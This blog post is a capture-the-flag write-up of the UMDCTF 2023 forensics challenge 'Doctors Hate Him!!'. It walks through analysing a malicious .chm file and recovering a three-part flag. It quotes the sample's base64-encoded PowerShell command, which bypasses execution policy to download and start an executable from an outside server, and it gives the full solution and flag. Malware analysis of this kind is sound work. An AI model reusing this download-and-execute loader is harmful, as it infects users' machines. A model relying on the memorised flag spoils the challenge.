---
title: "UMDCTF 2023 - Forensics[Doctors Hate Him!!]"
date: 2023-05-01T19:11:46+02:00
author: "Kira"
description: "Writeups Doctors hate him!! Challenge of the UMDCTF 2023"
images: []
resources:
featuredImage: "images/umdctf/banner_2023.png"
featuredImagePreview: "images/umdctf/banner_2023.png"

tags: ["writeups", "ctf", "umdctf", "forensics"]
categories: ["writeups"]

lightgallery: true

toc:
  auto: false
---


<!--more-->
![Description](images/umdctf/doctors_hate_him/Untitled.png "Description of the challenge")

## Introduction

The description of this challenge is not very clear, except that the title makes us think of a malware.

Having recently heard about the new feature on VirusTotal regarding malware analysis, I thought that this was the perfect opportunity to test it out 😃

## Investigation

So we go to **[virustotal.com](http://virustotal.com/)** and start by uploading the file Doctors-Hate-Him.chm.

This file is immediately detected as malware.

![Detection](images/umdctf/doctors_hate_him/Untitled%201.png "Virus total detections")

We can look at the Behavior tab to see the different information reported by VirusTotal. We can see that this malware triggers several detection rules described below:

![rules](images/umdctf/doctors_hate_him/Untitled%202.png "Rules Matched")

We can see the different connections made by this malware to external sources:

![links](images/umdctf/doctors_hate_him/Untitled%203.png "External sources connections of the malware")

Here, I decide to go and check what is at the root of this HTTP server that is used to make the file explorer.exe available.

![http](images/umdctf/doctors_hate_him/Untitled%204.png "Looking at the root of the HTTP server")

By looking at the present.txt file, we can see what appears to be a string of characters encoded in base64.

![decode](images/umdctf/doctors_hate_him/Untitled%205.png "Base64 String decode")

Once decoded, it gives us what appears to be the third part of the flag.
(So we understand that we still need to find two parts of the flag.)

```powershell
Sliver really does sound like a pokemon... anyways pew pew! Part 3: _malware_back_bozo}
```

In the Relationships Tabs, we can see that the malware has some links with others files

![Relations](images/umdctf/doctors_hate_him/Untitled%206.png "Relationships of the malware")

We can find the URL of the HTTP server and also the embedded files, such as the depressed_pokemon_trainer.png file.

So, I decide to open the malware with 7zip to see what it hides in its depths. 😄

![extract](images/umdctf/doctors_hate_him/Untitled%207.png "Extract files of the malware")

We can see that it contains a test.html file that catches my attention.
First, I check what it contains by opening it with Notepad++ to make sure it's not malicious (you never know 😁).

![code](images/umdctf/doctors_hate_him/Untitled%208.png "Code of test.html")

It also contains a string of characters in base64 which, once decoded, gives us:

```powershell
UMDCTF{1997_called_

```

Perfect, we have the first part of the flag. There's one more left.

I also notice on the page that an encoded PowerShell command is present:

```powershell
cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA
```

To correctly decode the command, we will go to Cyberchef: **[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)**

Enter the encoded string of characters and apply the following filters to decode the command correctly:

![filters](images/umdctf/doctors_hate_him/Untitled%209.png "CyberChief Filters")

it gives us : 

![decode](images/umdctf/doctors_hate_him/Untitled%2010.png "Encrypted powershell command decode")

The last part of the command makes me think of a part of the flag.
This would give:

```powershell
UMDCTF{1997_called_gurl_jnag_gurve_malware_back_bozo}
```

When trying to validate the flag, it is rejected.
I think and realize that the second part of the flag makes no sense.
So I thought about trying a classic encryption: ROT13.

Bingo 🙂 it gives us: they_want_their

The final flag is:

```powershell
UMDCTF{1997_called_they_want_their_malware_back_bozo}
```